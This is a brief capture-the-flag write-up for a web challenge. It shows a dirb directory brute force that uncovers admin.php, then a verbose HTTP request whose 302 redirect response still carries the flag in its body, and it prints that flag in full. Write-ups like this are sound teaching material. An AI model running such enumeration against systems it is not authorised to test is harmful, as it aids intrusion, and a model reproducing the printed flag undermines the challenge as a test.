
Tried to find subpaths with ``dirb``, *admin.php* poped up.

```bash
$ dirb http://chall1.heroctf.fr:9000 ../dirb222/wordlists/common.txt

---- Scanning URL: http://chall1.heroctf.fr:9000/ ----
+ http://chall1.heroctf.fr:9000/admin.php (CODE:302|SIZE:50)
```

A request to *http://chall1.heroctf.fr:9000/admin.php* responsed the flag.

```bash
$ http -v http://chall1.heroctf.fr:9000/admin.php
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 50
Content-Type: text/html; charset=UTF-8
Date: Sun, 25 Apr 2021 01:32:59 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Location: /index.php?error=You are not admin !
Pragma: no-cache
Server: Apache/2.4.38 (Debian)
Set-Cookie: PHPSESSID=7fc4e7c32c82c736308ee3b54f87c336; path=/
X-Powered-By: PHP/7.2.34

Flag : Hero{r3d1r3c710n_c4n_b3_d4n63r0u5_57395379}
```
